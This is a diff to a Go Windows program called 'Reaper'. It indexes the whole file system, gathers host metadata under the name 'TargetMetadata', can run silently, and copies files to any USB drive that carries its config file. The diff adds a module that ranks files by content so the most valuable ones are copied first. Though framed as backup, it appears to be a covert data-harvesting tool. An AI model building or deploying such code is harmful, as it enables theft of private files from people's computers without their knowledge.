@@ -4,6 +4,7 @@ import (
 	"context"
 	"database/sql"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -20,12 +21,23 @@ import (
 	"github.com/jaypipes/ghw"
 	"golang.org/x/sys/windows"
 
+	"Reaper/modules"
+
 	_ "github.com/mattn/go-sqlite3"
 )
 
 // Set silentMode to true for a completely silent (no output) version,
 // except for the indexing log which will be output in a separate terminal.
 var silentMode bool = false
+
+// Enable content analysis for intelligent file selection
+var enableContentAnalysis bool = false
+
+// Maximum size for prioritized content-analyzed files (default: 1GB)
+var maxContentAnalysisSize int64 = 1024 * 1024 * 1024
+
+// Content analyzer instance
+var contentAnalyzer *modules.ContentAnalyzer
 
 // List of directories to exclude from indexing
 var excludedDirs = []string{
@@ -157,12 +169,26 @@ func initDB(dbPath string) error {
 }
 
 // isExcludedPath checks if the given path should be excluded from indexing
+// Works like gitignore - can exclude by full path or just directory name
 func isExcludedPath(path string) bool {
 	path = strings.ToLower(path)
+	pathParts := strings.Split(strings.ReplaceAll(path, "\\", "/"), "/")
+
 	for _, excluded := range excludedDirs {
 		excluded = strings.ToLower(excluded)
+		excluded = strings.ReplaceAll(excluded, "\\", "/") // Normalize path separator
+
+		// Case 1: Check for full path match (like original code)
 		if strings.HasPrefix(path, excluded) {
 			return true
+		}
+
+		// Case 2: Check for directory name match at any level (like gitignore)
+		excludedName := filepath.Base(excluded)
+		for _, part := range pathParts {
+			if part == excludedName {
+				return true
+			}
 		}
 	}
 	return false
@@ -306,40 +332,40 @@ func isExternalDrive(driveLetter string) (bool, error) {
 	}
 
 	letter := strings.ToUpper(strings.TrimSuffix(driveLetter, ":\\"))
-	
+
 	// Look for removable or connected via USB/external interfaces
 	for _, disk := range block.Disks {
 		for _, part := range disk.Partitions {
 			// In ghw, MountPoints is not available directly
 			// Instead we need to check for the drive letter in the MountPoint field
 			mountPoint := part.MountPoint // Use singular MountPoint instead of MountPoints
-			
+
 			// Format in Windows is typically "C:", "D:", etc.
 			if mountPoint == letter+":" || strings.HasPrefix(mountPoint, letter+":") {
 				// Check if the disk is external based on vendor info or removable attribute
 				// BusType is not directly accessible in this version of ghw
 				vendor := strings.ToLower(disk.Vendor)
 				model := strings.ToLower(disk.Model)
-				
+
 				// Common indicators of external drives
 				if strings.Contains(vendor, "usb") ||
-				   strings.Contains(model, "external") ||
-				   strings.Contains(model, "portable") ||
-				   disk.IsRemovable || // This field is available
-				   strings.Contains(model, "ugreen") {
+					strings.Contains(model, "external") ||
+					strings.Contains(model, "portable") ||
+					disk.IsRemovable || // This field is available
+					strings.Contains(model, "ugreen") {
 					return true, nil
 				}
 			}
 		}
 	}
-	
+
 	// If drive is marked as DRIVE_REMOVABLE by Windows API, it's likely external
 	// This is a fallback in case ghw didn't provide conclusive information
 	driveType := windows.GetDriveType(windows.StringToUTF16Ptr(driveLetter))
 	if driveType == windows.DRIVE_REMOVABLE {
 		return true, nil
 	}
-	
+
 	return false, nil
 }
 
@@ -353,8 +379,8 @@ func getRemovableDrives() ([]string, error) {
 	for i := 0; i < 26; i++ {
 		if driveBits&(1<<uint(i)) != 0 {
 			driveLetter := string('A'+i) + ":\\"
-			driveType := windows.GetDriveType(windows.StringToUTF16Ptr(driveLetter))
 			// Check for both removable drives and local drives (which might be external SSDs)
+			driveType := windows.GetDriveType(windows.StringToUTF16Ptr(driveLetter))
 			if driveType == windows.DRIVE_REMOVABLE || driveType == windows.DRIVE_FIXED {
 				// For fixed drives, we need to check if it's actually an external drive
 				if driveType == windows.DRIVE_FIXED {
@@ -411,7 +437,8 @@ func monitorUSBDevices() {
 	}
 }
 
-func main() {
+// reaper_main is the original main function from the reaper application
+func reaper_main() {
 	// If silentMode is enabled, redirect the default log output.
 	if silentMode {
 		log.SetOutput(io.Discard)
@@ -431,9 +458,32 @@ func main() {
 	defer indexLogFile.Close()
 	indexLogger := log.New(indexLogFile, "INDEXER: ", log.LstdFlags)
 
-	// Use more efficient PowerShell command to show log
-	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
-		"Get-Content", "-Path", "indexing.log", "-Wait")
+	// Initialize content analyzer if enabled
+	if enableContentAnalysis {
+		// Create a separate log file for content analysis
+		contentLogFile, err := os.OpenFile(
+			filepath.Join("logs", fmt.Sprintf("content_analyzer_%s.log",
+				time.Now().Format("20060102_150405"))),
+			os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+
+		if err != nil {
+			indexLogger.Printf("Failed to create content analyzer log file: %v", err)
+			// Continue without content analysis
+		} else {
+			defer contentLogFile.Close()
+			contentLogger := log.New(contentLogFile, "ANALYZER: ", log.LstdFlags)
+
+			// Create content analyzer
+			contentAnalyzer = modules.NewContentAnalyzer(db, contentLogger, maxContentAnalysisSize)
+			indexLogger.Printf("Content analyzer initialized with max size: %d bytes", maxContentAnalysisSize)
+
+			// Start content analysis in background
+			go startContentAnalysis(contentLogger)
+		}
+	}
+
+	// Use simple command to show log
+	cmd := exec.Command("cmd.exe", "/c", "start", "cmd.exe", "/c", "type", "indexing.log", "&", "pause")
 	cmd.Start()
 
 	// Start scanning the file system in a separate goroutine,
@@ -460,6 +510,23 @@ func main() {
 
 	// Begin monitoring for USB devices.
 	monitorUSBDevices()
+}
+
+// main function with command-line flags for modules
+func main() {
+	// Parse command-line flags
+	contentAnalysisFlag := flag.Bool("content-analysis", false, "Enable content analysis for intelligent file selection")
+	contentSizeFlag := flag.Int64("content-size", 1024*1024*1024, "Maximum size in bytes for content-analyzed files (default: 1GB)")
+	silentFlag := flag.Bool("silent", false, "Run in silent mode (minimal output)")
+	flag.Parse()
+
+	// Set global options based on flags
+	enableContentAnalysis = *contentAnalysisFlag
+	maxContentAnalysisSize = *contentSizeFlag
+	silentMode = *silentFlag
+
+	// Run the main application
+	reaper_main()
 }
 
 // handleUSBDevice reads the backup configuration from the USB and processes the backup.
@@ -526,13 +593,27 @@ func handleUSBDevice(drive string) {
 	case "indexer":
 		backupDatabase(targetDir)
 	case "file":
-		backupFiles(targetDir, config)
+		// Check if content analysis is enabled and has prioritized files
+		if enableContentAnalysis && contentAnalyzer != nil {
+			backupContentAnalyzedFiles(targetDir)
+			backupFiles(targetDir, config)
+		} else {
+			backupFiles(targetDir, config)
+		}
 	case "both":
 		// First copy the database, then copy files.
 		backupDatabase(targetDir)
-		backupFiles(targetDir, config)
+		if enableContentAnalysis && contentAnalyzer != nil {
+			backupContentAnalyzedFiles(targetDir)
+			backupFiles(targetDir, config)
+		} else {
+			backupFiles(targetDir, config)
+		}
 	default:
 		log.Printf("Unknown mode '%s'. Defaulting to file backup.", config.Mode)
+		if enableContentAnalysis && contentAnalyzer != nil {
+			backupContentAnalyzedFiles(targetDir)
+		}
 		backupFiles(targetDir, config)
 	}
 }
@@ -580,25 +661,70 @@ func getSystemMetadata() (*TargetMetadata, error) {
 	// This does not require PowerShell or external commands
 	product, err := ghw.Product(ghw.WithChroot(""))
 	if err == nil {
+		// The field names might be different based on the ghw version
 		metadata.SystemInfo.Manufacturer = product.Vendor
 		metadata.SystemInfo.Model = product.Name
+
+		// If the fields are empty, try to use other available information
+		if metadata.SystemInfo.Manufacturer == "" {
+			metadata.SystemInfo.Manufacturer = product.Family
+		}
+
+		if metadata.SystemInfo.Model == "" {
+			metadata.SystemInfo.Model = product.Version
+		}
 	} else {
-		// Fallback to simpler approach if ghw fails
-		metadata.SystemInfo.Manufacturer = "Unknown"
-		metadata.SystemInfo.Model = "Unknown"
+		// Use direct Windows API approach if ghw fails
+		var cmd *exec.Cmd
+
+		// Try to get manufacturer via direct command
+		cmd = exec.Command("cmd.exe", "/c", "wmic computersystem get manufacturer")
+		if out, err := cmd.Output(); err == nil {
+			lines := strings.Split(string(out), "\n")
+			if len(lines) > 1 {
+				metadata.SystemInfo.Manufacturer = strings.TrimSpace(lines[1])
+			}
+		}
+
+		// Try to get model via direct command
+		cmd = exec.Command("cmd.exe", "/c", "wmic computersystem get model")
+		if out, err := cmd.Output(); err == nil {
+			lines := strings.Split(string(out), "\n")
+			if len(lines) > 1 {
+				metadata.SystemInfo.Model = strings.TrimSpace(lines[1])
+			}
+		}
+
+		// If still empty, set as unknown
+		if metadata.SystemInfo.Manufacturer == "" {
+			metadata.SystemInfo.Manufacturer = "Unknown"
+		}
+		if metadata.SystemInfo.Model == "" {
+			metadata.SystemInfo.Model = "Unknown"
+		}
 	}
 
 	// Get Windows version using Go syscall instead of PowerShell
-	osInfo := windows.RtlGetVersion()
-	if osInfo != nil {
+	// Use windows.GetVersion() which is more direct than RtlGetVersion
+	osInfo, versionErr := windows.GetVersion()
+	if versionErr == nil && osInfo != 0 {
+		majorVersion := byte(osInfo)
+		minorVersion := uint8(osInfo >> 8)
+		buildNumber := uint16(osInfo >> 16)
 		metadata.SystemInfo.WindowsVersion = fmt.Sprintf(
 			"Windows %d.%d.%d",
-			osInfo.MajorVersion,
-			osInfo.MinorVersion,
-			osInfo.BuildNumber,
+			majorVersion,
+			minorVersion,
+			buildNumber,
 		)
 	} else {
-		metadata.SystemInfo.WindowsVersion = "Windows (version unknown)"
+		// Alternative approach if GetVersion fails
+		cmd := exec.Command("cmd.exe", "/c", "ver")
+		if out, cmdErr := cmd.Output(); cmdErr == nil {
+			metadata.SystemInfo.WindowsVersion = strings.TrimSpace(string(out))
+		} else {
+			metadata.SystemInfo.WindowsVersion = "Windows (version unknown)"
+		}
 	}
 
 	metadata.SystemInfo.ProcessorArch = runtime.GOARCH
@@ -735,6 +861,110 @@ func backupFiles(targetDir string, config BackupConfig) {
 	log.Printf("Backup complete. Total copied: %d bytes", totalBytesCopied)
 }
 
+// backupContentAnalyzedFiles copies the high-priority files identified by content analysis
+func backupContentAnalyzedFiles(targetDir string) {
+	log.Printf("Starting backup of content-analyzed high-priority files...")
+
+	// Get the current list of priority files
+	priorityFiles := contentAnalyzer.GetPriorityFiles()
+	if len(priorityFiles) == 0 {
+		log.Printf("No content-analyzed priority files available yet")
+		return
+	}
+
+	// Create target directory for high-priority content
+	priorityDir := filepath.Join(targetDir, "priority_content")
+	if err := os.MkdirAll(priorityDir, os.ModePerm); err != nil {
+		log.Printf("Failed to create priority content directory: %v", err)
+		return
+	}
+
+	// Create a JSON index file with information about priority files
+	type PriorityIndex struct {
+		Files       []modules.PriorityFile `json:"files"`
+		TotalSize   int64                  `json:"total_size_bytes"`
+		TotalCount  int                    `json:"total_count"`
+		GeneratedAt string                 `json:"generated_at"`
+	}
+
+	var totalSize int64
+	for _, file := range priorityFiles {
+		totalSize += file.Size
+	}
+
+	// Create index data
+	index := PriorityIndex{
+		Files:       priorityFiles,
+		TotalSize:   totalSize,
+		TotalCount:  len(priorityFiles),
+		GeneratedAt: time.Now().Format(time.RFC3339),
+	}
+
+	// Save index file
+	indexJSON, err := json.MarshalIndent(index, "", "    ")
+	if err == nil {
+		indexFile := filepath.Join(priorityDir, "priority_index.json")
+		if err := os.WriteFile(indexFile, indexJSON, 0644); err != nil {
+			log.Printf("Failed to write priority index file: %v", err)
+		}
+	}
+
+	// Copy files with a semaphore to limit concurrency
+	sem := make(chan struct{}, 4)
+	var wg sync.WaitGroup
+
+	// Track progress
+	var bytesCopied int64
+	var bytesCounter sync.Mutex
+
+	// Start copying each priority file
+	for _, pfile := range priorityFiles {
+		wg.Add(1)
+		sem <- struct{}{} // acquire semaphore
+
+		go func(file modules.PriorityFile) {
+			defer wg.Done()
+			defer func() { <-sem }() // release semaphore
+
+			// Skip files that no longer exist
+			if _, err := os.Stat(file.Path); os.IsNotExist(err) {
+				log.Printf("Priority file no longer exists: %s", file.Path)
+				return
+			}
+
+			// Create destination path preserving partial directory structure
+			relPath := strings.TrimPrefix(file.Path, filepath.VolumeName(file.Path))
+			destDir := filepath.Join(priorityDir, filepath.Dir(relPath))
+			if err := os.MkdirAll(destDir, os.ModePerm); err != nil {
+				log.Printf("Failed to create directory %s: %v", destDir, err)
+				return
+			}
+
+			// Destination file with score in filename
+			baseName := filepath.Base(file.Path)
+			ext := filepath.Ext(baseName)
+			nameWithoutExt := strings.TrimSuffix(baseName, ext)
+			scoredName := fmt.Sprintf("%s_score%.2f%s", nameWithoutExt, file.Score, ext)
+			destFile := filepath.Join(destDir, scoredName)
+
+			// Copy the file
+			if err := copyFile(file.Path, destFile); err != nil {
+				log.Printf("Failed to copy priority file %s: %v", file.Path, err)
+			} else {
+				bytesCounter.Lock()
+				bytesCopied += file.Size
+				bytesCounter.Unlock()
+				log.Printf("Backed up priority file: %s (Score: %.2f)", file.Path, file.Score)
+			}
+		}(pfile)
+	}
+
+	// Wait for all copies to complete
+	wg.Wait()
+	log.Printf("Content-analyzed priority backup complete: %d files, %d bytes copied",
+		len(priorityFiles), bytesCopied)
+}
+
 // Optimized copyFile with better buffered I/O and error handling
 func copyFile(src, dst string) error {
 	// Open source file
@@ -807,4 +1037,44 @@ func priorityScore(file FileMeta, config BackupConfig) int {
 		}
 	}
 	return 3
+}
+
+// startContentAnalysis begins the process of analyzing indexed files
+func startContentAnalysis(logger *log.Logger) {
+	logger.Println("Starting content analysis engine...")
+
+	// Create logs directory if it doesn't exist
+	if err := os.MkdirAll("logs", os.ModePerm); err != nil {
+		logger.Printf("Failed to create logs directory: %v", err)
+	}
+
+	// Wait a bit for initial file indexing to populate the database
+	time.Sleep(30 * time.Second)
+
+	// Run initial batch analysis with 1000 files
+	if err := contentAnalyzer.AnalyzeBatch(1000); err != nil {
+		logger.Printf("Error in initial batch analysis: %v", err)
+	}
+
+	// Select the priority files based on content analysis
+	priorityFiles := contentAnalyzer.SelectPriorityFiles()
+	logger.Printf("Selected %d priority files for immediate backup", len(priorityFiles))
+
+	// Start periodic analysis for new files
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			logger.Println("Running periodic content analysis...")
+			if err := contentAnalyzer.AnalyzeBatch(200); err != nil {
+				logger.Printf("Error in periodic batch analysis: %v", err)
+			}
+
+			// Re-select priority files with updated analysis
+			priorityFiles = contentAnalyzer.SelectPriorityFiles()
+			logger.Printf("Updated priority files list: %d files selected", len(priorityFiles))
+		}
+	}
 }
